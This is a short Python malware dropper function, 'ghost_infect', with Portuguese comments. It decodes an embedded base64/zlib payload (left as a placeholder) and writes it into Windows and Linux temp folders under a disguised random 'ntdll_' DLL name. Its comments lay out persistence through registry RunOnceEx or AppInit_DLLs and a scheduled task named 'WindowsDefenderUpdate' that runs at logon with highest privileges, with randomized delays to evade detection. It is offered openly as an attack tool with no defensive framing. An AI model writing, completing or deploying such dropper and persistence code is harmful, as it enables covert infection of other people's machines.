def ghost_infect():
    """Entra sem alarde - living off the land total"""
    targets = [
        # prioriza caminhos que quase todo Windows/Enterprise tem
        r"C:\Windows\Temp",
        os.path.expanduser("~\\AppData\\Local\\Temp"),
        "/tmp", "/var/tmp"   # linux fantasma
    ]
    
    payload_b64 = "BASE64_DO_SEU_PAYLOAD_AQUI"           # nunca commit isso
    payload = zlib.decompress(base64.b64decode(payload_b64))
    
    for base in targets:
        try:
            ghost_name = f"ntdll_{os.urandom(4).hex()}.dll"   # nome q engana eyes
            path = os.path.join(base, ghost_name)
            with open(path, "wb") as f:
                f.write(payload)
            # reg add pra persistência leve (RunOnceEx ou AppInit_DLLs moderno)
            # schtasks /create /tn "WindowsDefenderUpdate" /tr path /sc onlogon /rl highest
            # tudo com delay randomizado 300–1800s
        except:
            pass

